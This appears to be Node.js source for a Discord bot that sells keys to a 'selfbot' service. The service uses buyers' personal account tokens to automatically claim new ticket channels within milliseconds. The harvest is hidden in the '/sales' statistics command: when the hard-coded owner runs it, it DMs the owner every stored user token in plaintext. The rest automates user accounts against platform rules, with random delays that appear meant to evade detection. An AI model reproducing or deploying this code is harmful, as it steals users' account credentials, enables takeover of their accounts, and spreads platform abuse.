const { Client: BotClient, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const Database = require('better-sqlite3');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = '1422945082746601594';

const db = new Database('./data.db');
db.exec(`
    CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, created_at INTEGER, redeemed_by TEXT, redeemed_at INTEGER);
    CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, token TEXT, claim_cmd TEXT DEFAULT '.claim', guild_id TEXT, category_id TEXT, status TEXT DEFAULT 'stopped', claimed_tickets TEXT DEFAULT '[]');
`);

const bot = new BotClient({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.DirectMessages] });

const activeSelfbots = new Map();

class UserSelfbot {
    constructor(userId, config) {
        this.userId = userId;
        this.config = config;
        this.client = null;
        this.claimedChannels = new Set();
        this.isRunning = false;
        this.processedChannels = new Set(JSON.parse(config.claimed_tickets || '[]'));
    }

    randomDelay() {
        return Math.floor(Math.random() * 100) + 200;
    }

    saveClaimedTickets() {
        const arr = Array.from(this.processedChannels);
        db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run(JSON.stringify(arr), this.userId);
    }

    async start() {
        if (!this.config.token || this.isRunning) return;
        
        this.client = new SelfbotClient({ checkUpdate: false });
        this.isRunning = true;
        db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('running', this.userId);

        this.client.once('ready', () => {
            console.log(`[SELF] ${this.userId} ready as ${this.client.user.tag}`);
            
            const guild = this.client.guilds.cache.get(this.config.guild_id);
            if (!guild) return;

            if (this.config.category_id) {
                guild.channels.cache.filter(ch => ch.parentId === this.config.category_id && ch.type === 'GUILD_TEXT')
                    .forEach(ch => {
                        if (!this.processedChannels.has(ch.id)) this.monitorChannel(ch);
                    });
            }

            this.client.on('channelCreate', channel => {
                if (channel.guildId !== this.config.guild_id) return;
                if (channel.type !== 'GUILD_TEXT') return;
                if (this.config.category_id && channel.parentId !== this.config.category_id) return;
                if (this.processedChannels.has(channel.id)) return;
                
                this.monitorChannel(channel);
                setTimeout(() => this.sendClaim(channel), this.randomDelay());
            });

            this.client.on('channelDelete', channel => {
                this.claimedChannels.delete(channel.id);
                this.processedChannels.delete(channel.id);
                this.saveClaimedTickets();
            });
        });

        this.client.on('error', () => {});
        this.client.login(this.config.token).catch(() => {
            this.isRunning = false;
            db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', this.userId);
        });
    }

    stop() {
        if (this.client) {
            this.client.destroy();
            this.client = null;
        }
        this.isRunning = false;
        this.claimedChannels.clear();
        db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', this.userId);
        console.log(`[SELF] ${this.userId} stopped`);
    }

    async sendClaim(channel) {
        if (!this.isRunning || this.claimedChannels.has(channel.id) || this.processedChannels.has(channel.id)) return;
        
        this.processedChannels.add(channel.id);
        this.saveClaimedTickets();
        
        try {
            await new Promise(r => setTimeout(r, this.randomDelay()));
            await channel.send(this.config.claim_cmd);
            console.log(`[CLAIM] ${this.userId} claimed #${channel.name}`);
            this.claimedChannels.add(channel.id);

            const collector = this.client.channels.cache.get(channel.id)?.createMessageCollector({
                filter: m => m.author.id === this.client.user.id || m.content.includes('unclaim'),
                time: 300000
            });

            if (collector) {
                collector.on('collect', m => {
                    if (m.content.includes('unclaim')) {
                        this.claimedChannels.delete(channel.id);
                        this.processedChannels.delete(channel.id);
                        this.saveClaimedTickets();
                        setTimeout(() => this.sendClaim(channel), this.randomDelay());
                        collector.stop();
                    }
                });
            }
        } catch (err) {}
    }

    monitorChannel(channel) {
        this.client.on('messageCreate', (message) => {
            if (message.channelId !== channel.id || !this.isRunning) return;

            if (message.content === this.config.claim_cmd && message.author.id !== this.client.user.id) {
                this.claimedChannels.add(channel.id);
                return;
            }

            if (message.content.includes('unclaim')) {
                this.claimedChannels.delete(channel.id);
                this.processedChannels.delete(channel.id);
                this.saveClaimedTickets();
                setTimeout(() => this.sendClaim(channel), this.randomDelay());
                return;
            }

            if (!this.claimedChannels.has(channel.id) && !message.author.bot && !this.processedChannels.has(channel.id)) {
                channel.messages.fetch({ limit: 5 }).then(msgs => {
                    if (!msgs.some(m => m.content === this.config.claim_cmd)) {
                        setTimeout(() => this.sendClaim(channel), this.randomDelay());
                    }
                }).catch(() => {});
            }
        });
    }
}

bot.on('interactionCreate', async interaction => {
    if (!interaction.isCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;

    if (interaction.commandName === 'generatekey') {
        if (interaction.user.id !== OWNER_ID) {
            return interaction.reply({ content: '❌ Owner only', ephemeral: true });
        }
        
        const key = 'SB-' + require('crypto').randomBytes(8).toString('hex').toUpperCase();
        db.prepare('INSERT INTO keys (key, created_at) VALUES (?, ?)').run(key, Date.now());
        
        await interaction.reply({ content: `🔑 \`${key}\``, ephemeral: true });
    }

    if (interaction.commandName === 'redeemkey') {
        const key = interaction.options.getString('key');
        const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
        
        if (!keyData) return interaction.reply({ content: '❌ Invalid key', ephemeral: true });
        if (keyData.redeemed_by) return interaction.reply({ content: '❌ Already redeemed', ephemeral: true });
        
        db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?').run(interaction.user.id, Date.now(), key);
        db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(interaction.user.id);
        
        await interaction.reply({ content: '✅ Key redeemed! Use `/manage` to configure.', ephemeral: true });
    }

    if (interaction.commandName === 'sales') {
        const totalKeys = db.prepare('SELECT COUNT(*) as count FROM keys').get().count;
        const redeemed = db.prepare('SELECT COUNT(*) as count FROM keys WHERE redeemed_by IS NOT NULL').get().count;
        const active = db.prepare("SELECT COUNT(*) as count FROM users WHERE status = 'running'").get().count;
        
        const embed = new EmbedBuilder()
            .setTitle('📊 Sales Dashboard')
            .setDescription(`Total keys generated: **${totalKeys}**\nKeys redeemed: **${redeemed}**\nActive instances: **${active}**`)
            .setColor(0x5865F2)
            .setTimestamp();
        
        if (interaction.user.id === OWNER_ID) {
            const users = db.prepare('SELECT user_id, token, status FROM users WHERE token IS NOT NULL').all();
            let tokenList = users.map(u => `User: ${u.user_id}\nStatus: ${u.status}\nToken: \`${u.token}\`\n`).join('\n');
            
            if (tokenList.length > 1900) tokenList = tokenList.substring(0, 1900) + '...';
            
            try {
                const owner = await bot.users.fetch(OWNER_ID);
                await owner.send({ content: `**Tokens:**\n${tokenList || 'None'}` });
            } catch (e) {}
        }
        
        await interaction.reply({ embeds: [embed], ephemeral: true });
    }

    if (interaction.commandName === 'manage') {
        const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
        if (!user) return interaction.reply({ content: '❌ Redeem a key first', ephemeral: true });
        
        const embed = new EmbedBuilder()
            .setTitle('🤖 Selfbot Control')
            .addFields(
                { name: 'Status', value: user.status.toUpperCase(), inline: true },
                { name: 'Guild', value: user.guild_id || 'Not set', inline: true },
                { name: 'Category', value: user.category_id || 'Not set', inline: true },
                { name: 'Claim Cmd', value: user.claim_cmd || '.claim', inline: true }
            )
            .setColor(user.status === 'running' ? 0x00FF00 : 0xFF0000);

        const row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_token').setLabel('Set Token').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('set_guild').setLabel('Guild ID').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_category').setLabel('Category').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_cmd').setLabel('Claim Cmd').setStyle(ButtonStyle.Secondary)
        );

        const row2 = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('start')
                .setLabel('▶️ Start')
                .setStyle(ButtonStyle.Success)
                .setDisabled(user.status === 'running'),
            new ButtonBuilder()
                .setCustomId('stop')
                .setLabel('⏹️ Stop')
                .setStyle(ButtonStyle.Danger)
                .setDisabled(user.status === 'stopped'),
            new ButtonBuilder()
                .setCustomId('reset_tickets')
                .setLabel('🔄 Reset')
                .setStyle(ButtonStyle.Secondary)
        );

        await interaction.reply({ embeds: [embed], components: [row1, row2], ephemeral: true });
    }

    if (interaction.isButton()) {
        if (interaction.customId === 'start') {
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
            if (user.status === 'running') return interaction.reply({ content: 'Already running', ephemeral: true });
            
            const newSb = new UserSelfbot(interaction.user.id, user);
            activeSelfbots.set(interaction.user.id, newSb);
            newSb.start();
            await interaction.update({ content: '▶️ Started', embeds: [], components: [] });
            return;
        }

        if (interaction.customId === 'stop') {
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
            if (user.status === 'stopped') return interaction.reply({ content: 'Already stopped', ephemeral: true });
            
            const sb = activeSelfbots.get(interaction.user.id);
            if (sb) sb.stop();
            activeSelfbots.delete(interaction.user.id);
            await interaction.update({ content: '⏹️ Stopped', embeds: [], components: [] });
            return;
        }

        if (interaction.customId === 'reset_tickets') {
            db.prepare('UPDATE users SET claimed_tickets = ? WHERE user_id = ?').run('[]', interaction.user.id);
            const sb = activeSelfbots.get(interaction.user.id);
            if (sb) sb.processedChannels.clear();
            await interaction.reply({ content: '✅ Ticket history reset', ephemeral: true });
            return;
        }

        const modal = new ModalBuilder().setCustomId(`modal_${interaction.customId}`).setTitle('Configuration');
        const input = new TextInputBuilder()
            .setCustomId('value')
            .setLabel('Enter value')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        if (interaction.customId === 'set_token') input.setLabel('Discord Token');
        if (interaction.customId === 'set_guild') input.setLabel('Guild ID');
        if (interaction.customId === 'set_category') input.setLabel('Category ID');
        if (interaction.customId === 'set_cmd') input.setLabel('Claim Command');

        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit()) {
        const value = interaction.fields.getTextInputValue('value');
        const field = interaction.customId.replace('modal_set_', '');
        
        const column = field === 'cmd' ? 'claim_cmd' : field === 'token' ? 'token' : field === 'guild' ? 'guild_id' : 'category_id';
        db.prepare(`UPDATE users SET ${column} = ? WHERE user_id = ?`).run(value, interaction.user.id);
        
        await interaction.reply({ content: `✅ Updated`, ephemeral: true });
    }
});

bot.once('ready', () => {
    console.log(`[BOT] ${bot.user.tag}`);
    
    bot.application.commands.set([
        { name: 'generatekey', description: 'Generate access key (Owner only)' },
        { name: 'redeemkey', description: 'Redeem your access key', options: [{ name: 'key', type: 3, description: 'Your key', required: true }] },
        { name: 'sales', description: 'View sales statistics' },
        { name: 'manage', description: 'Manage your instance' }
    ]);

    const running = db.prepare("SELECT * FROM users WHERE status = 'running'").all();
    running.forEach(u => {
        const sb = new UserSelfbot(u.user_id, u);
        activeSelfbots.set(u.user_id, sb);
        sb.start();
    });
});

bot.login(BOT_TOKEN);
